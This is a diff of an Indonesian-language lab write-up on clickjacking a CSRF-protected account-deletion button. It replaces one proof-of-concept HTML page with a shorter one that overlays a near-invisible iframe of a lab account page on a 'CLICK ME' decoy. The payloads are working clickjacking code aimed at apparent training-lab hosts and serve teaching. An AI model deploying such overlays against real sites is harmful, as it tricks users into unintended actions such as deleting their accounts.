@@ -1,4 +1,4 @@
-# Clickjacking Dasar dengan Proteksi Token CSRF | 2 Jan 2022
+# Clickjacking Dasar dengan Proteksi Token CSRF 
 ## Latar Belakang
 Lab ini berisi fungsionalitas login dan tombol hapus akun yang dilindungi oleh token CSRF. Seorang pengguna akan mengklik elemen yang menampilkan kata "click" di situs web umpan.
 
@@ -33,32 +33,25 @@ Mereka menggunakan token CSRF untuk mencoba mencegah serangan CSRF.
 ### Membangun POC Clickjacking
 Sekarang, kita akan membangun `<iframe>` tersembunyi dan teks clickbait:
 
-```html
-<html>
-    <head>
-        <title>Basic clickjacking with CSRF token protection</title>
-        <style type="text/css">
-            #targetWebsite {
-                position:relative;
-                width:700px;
-                height:700px;
-                opacity:0.0001;
-                z-index:2;
-            }
+```
+<style>
+    iframe {
+        position: relative;
+        width: 1000px;
+        height: 700px;
+        opacity: 0.000001;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top: 515px;
+        left: 60px;
+        z-index: 1;
+    }
+</style>
+<div>CLICK ME</div>
+<iframe src="https://0aa2009303d2d4818284e76600e7000d.web-security-academy.net/my-account"></iframe>
 
-            #decoyWebsite {
-                position:absolute;
-                top:495px;
-                left:60px;
-                z-index:1;
-            }
-        </style>
-    </head>
-    <body>
-        <div id="decoyWebsite">Click me</div>
-        <iframe id="targetWebsite" src="https://0a2f006904c03654c0f5634d009f00aa.web-security-academy.net/my-account"></iframe>
-    </body>
-</html>
 ```
 
 ### Hosting dan Pengiriman ke Korban
